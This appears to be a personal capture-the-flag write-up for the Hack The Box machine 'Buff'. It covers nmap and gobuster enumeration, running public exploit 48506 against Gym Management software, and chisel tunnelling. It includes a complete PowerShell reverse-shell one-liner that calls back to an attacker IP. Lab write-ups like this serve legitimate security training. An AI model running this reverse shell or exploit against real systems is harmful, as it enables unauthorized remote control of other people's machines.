---
title: Buff
draft: false
tags:
---
![[Pasted image 20250304203750.png]]

Machine: https://app.hackthebox.com/machines/263
# Enumeration
## Port Scanning
- using [[content/Tools/Nmap|Nmap]] for service and version scanning
```bash
nmap -p- -sSU -n -Pn --min-rate 5000 10.10.10.198 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250304203954.png]]

```bash
nmap -p7680,8080 -sVC -n -Pn --min-rate 5000 10.10.10.198 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250304204404.png]]

## Web site Enumeration
- Used tecnologies
```bash
whatweb http://10.10.10.198:8080
```
>[!example]- Result
>![[Pasted image 20250304204826.png]]

- we can sing in, but we dont have valid credentials
>[!example]- Result
>![[Pasted image 20250304205133.png]]

- Now we can try to preform a directory enumeration using [[gobuster]]
```bash
gobuster dir -u http://10.10.10.198:8080/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --add-slash
```

- we get this:
Information leakage `http://10.10.10.198:8080/profile/`, `http://10.10.10.198:8080/ex/`
>[!example]- Result
>![[Pasted image 20250304205623.png]]
>![[Pasted image 20250304210003.png]]

- After looking for more information, we found the version of the used software
>[!example]- Result
>![[Pasted image 20250304210850.png]]

# Exploitation
- looks like this software version have a RCE vulnerability [link](https://www.exploit-db.com/exploits/48506) (use python2)
```bash
searchsploit Gym Management
python 48506.py http://10.10.10.198:8080/
```
>[!example]- Result
>![[Pasted image 20250304222313.png]]
>![[Pasted image 20250304222540.png]]

- now we can upgrade own session
```bash
rlwrap -cAr nc -nlvp 4444
```
- and on the victim machine
```cmd
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.6', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```
>[!example]- Result
>![[Pasted image 20250304230220.png]]
# Privilege Escalation
## Enumerating
- Local opened ports
>[!example]- Result
>![[Pasted image 20250304232133.png]]

- Get local users
```cmd
net users
```
>[!example]- Result
>![[Pasted image 20250304235549.png]]
- lets use [[chisel]] in order to create a proxy and get connection to this ports
Attacker
```bash
./chisel server --reverse -p 1234
```
Victim
```bash
.\chisel.exe client 10.10.16.6:1234 R:9999:socks
```

- after configure proxychain we have access
>[!example]- Result
>![[Pasted image 20250304235229.png]]
